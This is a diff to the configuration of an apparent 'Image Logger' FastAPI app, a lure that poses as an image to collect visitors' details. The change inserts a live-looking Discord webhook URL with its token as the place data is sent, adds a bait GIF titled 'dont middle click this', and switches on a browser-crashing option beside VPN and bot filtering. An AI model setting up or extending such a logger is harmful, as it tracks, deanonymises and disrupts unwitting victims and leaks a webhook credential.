@@ -6,13 +6,13 @@ from urllib.parse import unquote
 app = FastAPI()
 
 CONFIG = {
-    "webhook": "YOUR_WEB_HOOK",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
+    "webhook": "https://discordapp.com/api/webhooks/1513148042935533652/T0MTpHSvtvtUeC1FThHM5Swod9ghz2Ac4h9jSQlUfN2t6mTwYOJtNHBBPGeiPLtfz6Hp",
+    "image": "https://tenor.com/view/dont-middle-clikc-this-gif-gif-423237860644995677",
     "username": "Image Logger",
     "color": 0x00FFFF,
     "vpnCheck": 1, 
     "antiBot": 1,
-    "crashBrowser": False,
+    "crashBrowser": True,
     "buggedImage": True,
     "redirect": {"redirect": False, "page": "https://your-link.here"},
     "message": {"doMessage": False, "message": "This browser has been pwned.", "richMessage": True}
